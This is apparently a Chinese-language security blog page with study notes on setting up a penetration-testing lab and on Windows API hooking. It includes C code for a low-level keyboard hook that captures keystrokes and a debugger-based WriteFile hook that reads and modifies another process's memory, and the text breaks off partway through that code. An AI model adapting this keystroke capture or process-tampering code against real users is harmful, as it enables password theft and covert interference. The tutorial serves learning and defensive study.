<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 5.2.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-note/web/pentist" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/29/note/web/pentist/" class="article-date">
  	<time datetime="2020-10-29T01:27:32.000Z" itemprop="datePublished">2020-10-29</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/29/note/web/pentist/">
        渗透测试笔记
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="内网渗透环境搭建"><a href="#内网渗透环境搭建" class="headerlink" title="内网渗透环境搭建"></a>内网渗透环境搭建</h2><p>搭建四个靶机，两台Windows，两台Linux</p>
<ul>
<li><p>Linux#1: centos</p>
<p>搭载lamp服务+带漏洞的cms靶场</p>
</li>
<li><p>Linux#2:</p>
<p>作为Linux#1的mysql服务</p>
</li>
<li><p>Windows#1 2008或7</p>
</li>
<li><p>Windows#2 2008或7</p>
</li>
</ul>
<p>Linux#1桥接192和172</p>
<p>其它桥接192</p>
<p>本机桥接172</p>
<p>这样本机就只能访问172网段，其它可以互ping但是ping不通外网</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>雪殇佬</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/rev/win-hook" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/28/note/rev/win-hook/" class="article-date">
  	<time datetime="2020-10-28T00:36:03.000Z" itemprop="datePublished">2020-10-28</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/28/note/rev/win-hook/">
        Windows hook介绍
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>windows下hook机制主要是替换程序要使用的函数，以替换掉原函数的功能或者添加功能。</p>
<p>比如杀软主动防御功能，监控敏感API，对这些函数进行hook；木马病毒可能hook键盘消息来窃取用户输入，从而获得某些密码</p>
<p>windows下的hook主要分为应用层和内核层，内核层一般在x86平台使用，因为从Windows Vista x64开始引入Patch Guard技术极大地限制了Windows内核挂钩的使用。</p>
<p>内核层hook：</p>
<ul>
<li>SSDT hook</li>
</ul>
<p>应用层hook</p>
<ul>
<li><p>消息hook</p>
<ul>
<li>SetWindowsHook</li>
</ul>
</li>
<li><p>注入hook</p>
<ul>
<li><p>IAT hook</p>
</li>
<li><p>Inline Hook</p>
</li>
<li><p>HotFix Hook</p>
</li>
</ul>
</li>
<li><p>调试Hook</p>
<ul>
<li>DebugActiveProcess</li>
</ul>
</li>
</ul>
<h2 id="消息hook"><a href="#消息hook" class="headerlink" title="消息hook"></a>消息hook</h2><p>Windows消息流：</p>
<ol>
<li><p>发生键盘输入事件时，WM_KEYDOWN消息被添加到[OS message queue]</p>
</li>
<li><p>OS判断哪个应用程序发生了事件，然后从[OS message queue]取出消息，添加到相应应用程序的[application message queue]中</p>
</li>
<li><p>应用程序监视自身的[application message queue]，发现WM_KEYDOWN消息调用相应的事件处理程序</p>
</li>
</ol>
<p>钩子位于[OS message queue]和[application message queue]</p>
<p>代码实现：调用SetWindowsHookEx API</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_PROCESS_NAME <span class="meta-string">&quot;notepad.exe&quot;</span></span></span><br><span class="line"></span><br><span class="line">HHOOK g_hHook;</span><br><span class="line">HINSTANCE g_HInstance;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> szPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    KBDLLHOOKSTRUCT* keyNum = (KBDLLHOOKSTRUCT*)lParam;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (keyNum-&gt;flags == <span class="number">128</span> || keyNum-&gt;flags == <span class="number">129</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>, keyNum-&gt;vkCode);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(<span class="literal">NULL</span>, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStart</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    g_HInstance = GetModuleHandleA(<span class="literal">NULL</span>);</span><br><span class="line">    g_hHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, g_HInstance, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (g_hHook) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hook Success\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hook Failed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">_declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(g_hHook);</span><br><span class="line">        g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unhook Success\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HookStart();</span><br><span class="line">    MSG msg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 这里的代码参考了 https://blog.csdn.net/Simon798/article/details/98848050</span></span><br><span class="line">        <span class="keyword">if</span> (PeekMessageA(</span><br><span class="line">            &amp;msg,        <span class="comment">// MSG 接收这个消息</span></span><br><span class="line">            <span class="literal">NULL</span>,        <span class="comment">// 检测消息的窗口句柄，NULL：检索当前线程所有窗口消息</span></span><br><span class="line">            <span class="literal">NULL</span>,        <span class="comment">// 检查消息范围中第一个消息的值，NULL：检查所有消息（必须和下面的同时为NULL）</span></span><br><span class="line">            <span class="literal">NULL</span>,        <span class="comment">// 检查消息范围中最后一个消息的值，NULL：检查所有消息（必须和上面的同时为NULL）</span></span><br><span class="line">            PM_REMOVE    <span class="comment">// 处理消息的方式，PM_REMOVE：处理后将消息从队列中删除</span></span><br><span class="line">        )) &#123;</span><br><span class="line">            <span class="comment">// 把按键消息传递给字符消息</span></span><br><span class="line">            TranslateMessage(&amp;msg);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将消息分派给窗口程序</span></span><br><span class="line">            DispatchMessageW(&amp;msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            Sleep(<span class="number">0</span>);    <span class="comment">//避免CPU全负载运行</span></span><br><span class="line">    &#125;</span><br><span class="line">    HookStop();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里处理了所有的按键消息，如果有需要可以查阅相关资料。</p>
<p>如果有图形化界面，可以不用处理消息。因为图形化界面允许回调函数的。</p>
<p>弊端是只能监视较少消息，如击键消息，鼠标消息，窗口消息</p>
<h2 id="调试Hook"><a href="#调试Hook" class="headerlink" title="调试Hook"></a>调试Hook</h2><p>和调试器类似，让进程发生异常，然后自己捕获异常，对于被调试状态下的级进行恶意操作。</p>
<p>核心思路是将API的第一个字节修改为0xCC(INT 3)，当API被调用时，由于触发了异常，控制权交给调试器。</p>
<p>相关函数</p>
<ul>
<li><p>CreateProcess()</p>
<p>启动调试一个进程</p>
</li>
<li><p>DebugActiveProcess(ProcessID)</p>
<p>附加到一个进程</p>
</li>
<li><p>获取进程PID</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">traverseProcesses</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    pe32.dwSize = <span class="keyword">sizeof</span>(pe32);</span><br><span class="line">    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Create snap Error!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    BOOL bResult = Process32First(hProcessSnap, &amp;pe32);</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">num</span><span class="params">(<span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">while</span> (bResult) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">_bstr_t</span> <span class="title">b</span><span class="params">(pe32.szExeFile)</span></span>; <span class="comment">// 将宽字节转化为窄字节</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&#x27;[&#x27;</span> &lt;&lt; num++ &lt;&lt; <span class="string">&#x27;]&#x27;</span> &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; b &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; pe32.th32ProcessID &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        bResult = Process32Next(hProcessSnap, &amp;pe32);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>代码实现(64位，需要先阅读文档查看传参规则)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;comdef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_PROCESS_NAME <span class="meta-string">&quot;notepad.exe&quot;</span></span></span><br><span class="line"></span><br><span class="line">LPVOID WriteFileAddress = <span class="literal">NULL</span>;</span><br><span class="line">CREATE_PROCESS_DEBUG_INFO CreateProcessDebugInfomation;</span><br><span class="line">BYTE INT3 = <span class="number">0xCC</span>, OldByte = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">OnCreateProcessDebugEvent</span><span class="params">(LPDEBUG_EVENT pde)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// WriteFile()函数地址</span></span><br><span class="line">    WriteFileAddress = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;WriteFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// API Hook - WriteFile()</span></span><br><span class="line">    <span class="comment">//将WriteFile函数的首个字节改为0xcc</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;CreateProcessDebugInfomation, &amp;pde-&gt;u.CreateProcessInfo, <span class="keyword">sizeof</span>(CREATE_PROCESS_DEBUG_INFO));</span><br><span class="line">    ReadProcessMemory(CreateProcessDebugInfomation.hProcess, WriteFileAddress,</span><br><span class="line">        &amp;OldByte, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line">    WriteProcessMemory(CreateProcessDebugInfomation.hProcess, WriteFileAddress,</span><br><span class="line">        &amp;INT3, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">OnExceptionDebugEvent</span><span class="params">(LPDEBUG_EVENT pDebugEvent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CONTEXT Context;</span><br><span class="line">    PBYTE lpBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD64 dwNumOfBytesToWrite, dwAddrOfBuffer, i;</span><br><span class="line">    PEXCEPTION_RECORD pExceptionRecord = &amp;pDebugEvent-&gt;u.Exception.ExceptionRecord;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt;hex&lt;&lt; EXCEPTION_BREAKPOINT;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; hex &lt;&lt; pExceptionRecord-&gt;ExceptionCode;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// BreakPoint exception</span></span><br><span class="line">    <span class="keyword">if</span> (EXCEPTION_BREAKPOINT == pExceptionRecord-&gt;ExceptionCode)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 发生异常的地方是否为我们要钩取的函数</span></span><br><span class="line">        <span class="keyword">if</span> (WriteFileAddress == pExceptionRecord-&gt;ExceptionAddress)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// #1. Unhook</span></span><br><span class="line">            <span class="comment">//   先恢复，以免进入死循环</span></span><br><span class="line">            WriteProcessMemory(CreateProcessDebugInfomation.hProcess, WriteFileAddress,</span><br><span class="line">                &amp;OldByte, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #2. 获得线程上下背景文  为了修改EIp的值，来使进程恢复正常运行</span></span><br><span class="line">            Context.ContextFlags = CONTEXT_FULL;</span><br><span class="line">            GetThreadContext(CreateProcessDebugInfomation.hThread, &amp;Context);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #3. WriteFile() 根据ESP来获得WriteFile 函数的参数，以达到修改数据的目的</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//ReadProcessMemory(CreateProcessDebugInfomation.hProcess, (LPVOID)(Context.Rsp + 0x8),</span></span><br><span class="line">            <span class="comment">//    &amp;dwAddrOfBuffer, sizeof(DWORD), NULL);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//ReadProcessMemory(CreateProcessDebugInfomation.hProcess, (LPVOID)(Context.Rsp + 0xC),</span></span><br><span class="line">            <span class="comment">//    &amp;dwNumOfBytesToWrite, sizeof(DWORD), NULL);</span></span><br><span class="line">            <span class="comment">// 调试发现，64位情况下传参使用rcx,rdx,r8d,r9</span></span><br><span class="line">            dwAddrOfBuffer = Context.Rdx;</span><br><span class="line">            dwNumOfBytesToWrite = Context.R8;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt;hex&lt;&lt; Context.Rip &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">// #4.</span></span><br><span class="line">            lpBuffer = (PBYTE)<span class="built_in">malloc</span>(dwNumOfBytesToWrite + <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">memset</span>(lpBuffer, <span class="number">0</span>, dwNumOfBytesToWrite + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #5. WriteFile()</span></span><br><span class="line">            ReadProcessMemory(CreateProcessDebugInfomation.hProcess, (LPVOID)dwAddrOfBuffer,</span><br><span class="line">                lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n### original string ###\n%s\n&quot;</span>, lpBuffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #6. 修改数据</span></span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dwNumOfBytesToWrite; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0x61</span> &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= <span class="number">0x7A</span>)</span><br><span class="line">                    lpBuffer[i] -= <span class="number">0x20</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n### converted string ###\n%s\n&quot;</span>, lpBuffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #7. 调用原函数</span></span><br><span class="line">            WriteProcessMemory(CreateProcessDebugInfomation.hProcess, (LPVOID)dwAddrOfBuffer,</span><br><span class="line">                lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">free</span>(lpBuffer);</span><br><span class="line">            <span class="comment">// 设置EIP的值来实现正常运行，注意EIP的值为0xcc的下一条指令的地址。</span></span><br><span class="line">            Context.Rip = (DWORD64)WriteFileAddress;</span><br><span class="line">            SetThreadContext(CreateProcessDebugInfomation.hThread, &amp;Context);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 运行</span></span><br><span class="line">            ContinueDebugEvent(pDebugEvent-&gt;dwProcessId, pDebugEvent-&gt;dwThreadId, DBG_CONTINUE);</span><br><span class="line">            Sleep(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 再次钩取</span></span><br><span class="line">            WriteProcessMemory(CreateProcessDebugInfomation.hProcess, WriteFileAddress,</span><br><span class="line">                &amp;INT3, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DebugLoop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DEBUG_EVENT DebugEvent;</span><br><span class="line">    DWORD dwContinueStatus;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待调试事件</span></span><br><span class="line">    <span class="keyword">while</span> (WaitForDebugEvent(&amp;DebugEvent, INFINITE))</span><br><span class="line">    &#123;</span><br><span class="line">        dwContinueStatus = DBG_CONTINUE;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 